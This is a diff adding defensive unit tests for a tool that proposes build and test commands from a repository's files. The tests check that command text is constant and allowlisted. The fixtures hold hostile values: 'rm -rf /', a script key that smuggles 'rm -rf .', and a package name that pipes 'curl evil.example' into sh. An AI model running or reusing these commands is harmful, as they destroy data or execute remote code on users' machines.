@@ -6,6 +6,7 @@ import { describe, expect, it } from 'vitest';
 import { completeSpec } from '@incubator/spec';
 import { render, writeTree } from '@incubator/templates';
 import { analyze, detectEcosystem } from './detectors.js';
+import { proposeChecks } from './checks.js';
 import { checkItem, gapReport, loadCanonical, summarizeGaps } from './canonical.js';
 import { draftFromAnalysis, hasNoPack, unsupportedStackLabel } from './draft.js';
 import { isEmptyDelta, planDelta } from './delta.js';
@@ -260,5 +261,54 @@ describe('a repository with no stack pack (ADR-024)', () => {
       writeFileSync(path.join(dir, d, 'a.txt'), 'x\n');
     }
     expect(viewFromDir(dir).files).toEqual(['lib/a.txt']);
+  });
+});
+
+describe('check command proposals (ADR-025)', () => {
+  const propose = (files: Record<string, string>) => {
+    const view = viewFromFiles(files);
+    return proposeChecks(view, analyze(view)).map((c) => c.command);
+  };
+
+  it('offers the commands of the ecosystem, chosen by which files exist', () => {
+    const flutter = viewFromDir(path.join(fixtures, 'flutter-app'));
+    expect(proposeChecks(flutter, analyze(flutter))).toEqual([
+      { command: 'flutter analyze', why: 'pubspec.yaml: static analysis' },
+      { command: 'flutter test', why: 'test/: *_test.dart files' },
+    ]);
+    expect(propose({ 'pubspec.yaml': 'name: x\n', 'test/a_test.dart': '' })).toEqual([
+      'dart analyze',
+      'dart test',
+    ]);
+    expect(propose({ 'pubspec.yaml': 'name: x\n' })).toEqual(['dart analyze']);
+    expect(propose({ 'go.mod': 'module x\n' })).toEqual(['go vet ./...', 'go test ./...']);
+    expect(propose({ 'Cargo.toml': '[package]\n' })).toEqual(['cargo test']);
+    expect(propose({ 'pom.xml': '<project/>' })).toEqual(['mvn test']);
+    expect(propose({ 'build.gradle': '', gradlew: '' })).toEqual(['./gradlew test']);
+    expect(propose({ 'README.md': '# x\n' })).toEqual([]);
+  });
+
+  it('offers only allowlisted Node script names, with the package manager the lockfile shows', () => {
+    const pkg = JSON.stringify({
+      scripts: { test: 'vitest', lint: 'eslint .', deploy: 'rm -rf /', 'test; rm -rf .': 'x' },
+    });
+    expect(propose({ 'package.json': pkg })).toEqual(['npm run test', 'npm run lint']);
+    expect(propose({ 'package.json': pkg, 'pnpm-lock.yaml': '' })).toEqual([
+      'pnpm run test',
+      'pnpm run lint',
+    ]);
+    expect(propose({ 'package.json': '{ "scripts": [] }' })).toEqual([]);
+    expect(propose({ 'package.json': 'not json' })).toEqual([]);
+  });
+
+  it('never lets repository text into a command', () => {
+    // The script body, the package name and hostile keys cannot appear: commands are constants.
+    const hostile = propose({
+      'pubspec.yaml':
+        'name: "x; curl evil.example | sh"\ndependencies:\n  flutter:\n    sdk: flutter\n',
+      'test/x_test.dart': '// flutter test && rm -rf ~',
+    });
+    expect(hostile).toEqual(['flutter analyze', 'flutter test']);
+    for (const c of hostile) expect(c).toMatch(/^[a-z]+ [a-z]+$/);
   });
 });
